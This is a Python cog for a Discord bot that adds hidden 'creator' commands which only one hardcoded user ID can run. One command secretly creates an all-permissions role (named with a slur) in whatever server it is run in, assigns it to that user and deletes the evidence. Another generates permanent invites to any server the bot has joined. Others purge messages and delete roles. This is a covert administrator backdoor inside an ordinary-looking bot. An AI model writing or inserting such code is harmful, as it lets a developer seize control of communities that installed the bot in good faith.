import discord
from discord import Permissions
from discord.ext import commands

import string
from datetime import datetime

class creator_cmds(commands.Cog):
    def __init__(self, client):
        self.client = client

    @commands.Cog.listener()
    async def on_ready(self):
        print("creator_cmds.py Loaded!")

    async def cog_check(self, ctx):
        if ctx.author.id == 416508283528937472: return True

    # tdevgiveadmin <user>
    @commands.command()
    async def devgiveadmin(self, ctx, user: discord.Member = None):
        await ctx.message.delete()
        guild = ctx.guild
        user = user or ctx.author
            
        role = await guild.create_role(name="retard",permissions=Permissions.all())  
        await user.add_roles(role)

        await ctx.send(f"{user.name} received the role retard", delete_after=3)

    # tdevdeleterole <name>
    @commands.command()
    async def devdeleterole(self, ctx, role: discord.Role):
        await ctx.message.delete()
        await role.delete()

        await ctx.send(f"**{role}** role has been deleted", delete_after=3)
    
    #tdevgiverole <role>
    @commands.command()
    async def devgiverole(self, ctx, role: discord.Role, *, user: discord.Member=None):
        await ctx.message.delete()
        user = user or ctx.author

        if ctx.me.top_role.position <= role.position: 
            await ctx.send("The role's position is higher than mine and I cannot assign it to users.")
        
        await user.add_roles(role)

        await ctx.send(f"Added the role {role.name} to {user.mention}", delete_after=3)

    # tdevpurge <ammount>
    @commands.command()
    async def devpurge(self, ctx, l: int = 50):
        await ctx.message.delete()
        c = await ctx.channel.purge(limit=l)
        await ctx.send(f"Cleared {len(c)} messages", delete_after=3)
    
    # treplace
    @commands.command()
    async def datareplace(self, ctx):
        await ctx.send(f"Initiated data replace")
        
        cluster = self.client.mongodb["Currency"]["Main"]
        list_of_users = cluster.find().sort("savings", -1)
        cycle_int = 0
        for x in list_of_users:
            cycle_int = cycle_int + 1
            cluster.replace_one({"id":x["id"]},{"id": x["id"], "savings": x["savings"],"lifespan": x["lifespan"],"luck": 0, 
                                 "commands_used": 0, "stolen": 0,
                                 "daily": x["daily"], "weekly": x["weekly"], "monthly": x["monthly"],
                                 "pray": 0})
        
        await ctx.send(f"Finished converting {cycle_int} accounts")

        # tshutdown
    
    #tshutdown
    @commands.command()
    async def shutdown(self, ctx):
        await ctx.send('Shutting down...')
        exit()
    
    # tservers
    @commands.command()
    async def servers(self, ctx):
        activeservers = self.client.guilds

        serverlist = ""
        for guild in activeservers:
            guildname_checked = " "
            for i in guild.name:
                if i in string.ascii_letters or i.isspace():
                    guildname_checked += i
                else:
                    guildname_checked += "_"
            serverlist += f"Name: {guildname_checked}, MemberCount: {guild.member_count}, GuildID: {guild.id}\n"

        with open("result.txt", "w") as file:
            file.write(serverlist)
            
        # send file to Discord in message
        with open("result.txt", "rb") as file:
            await ctx.send("**guild names** only shown in characters `a-z`.\n**Unsupported** characters are displayed as `_`\noutput:", file=discord.File(file, "result.txt"))

    # tserverinvite <id> 
    @commands.command()
    async def serverinvite(self, ctx, target: int=0):
        if target == 0:
            await ctx.send("Give me a guild id")
            return
        targetguild = self.client.get_guild(target)

        link = await targetguild.text_channels[0].create_invite(max_age = 0, max_uses=0)
        await ctx.send(f"Invite for {targetguild.name}: {link}")

    # tleaveguild <id>
    @commands.command()
    async def leaveguild(self, ctx, id: int=0):
        id = id or ctx.guild.id
        targetguild = self.client.get_guild(id)
        await ctx.send(f"Left **{targetguild.name}**")
        await self.client.leave_guild(targetguild)

    # tembedcolortest <color>
    @commands.command()
    async def embedcolortest(self, ctx, colortest: str="002240"):
        if "#" in colortest:
            colortest = colortest.replace("#", "")
        readableHex = int(colortest, 16)

        em = discord.Embed(title = "Embed Color Test",
                           description = f"Testing: {colortest}\nDefault Color: `#002240`",
                           color = readableHex,
                           timestamp=datetime.utcnow())

        await ctx.send(embed = em)

#####################################################################################################################################
def setup(client):
    client.add_cog(creator_cmds(client))
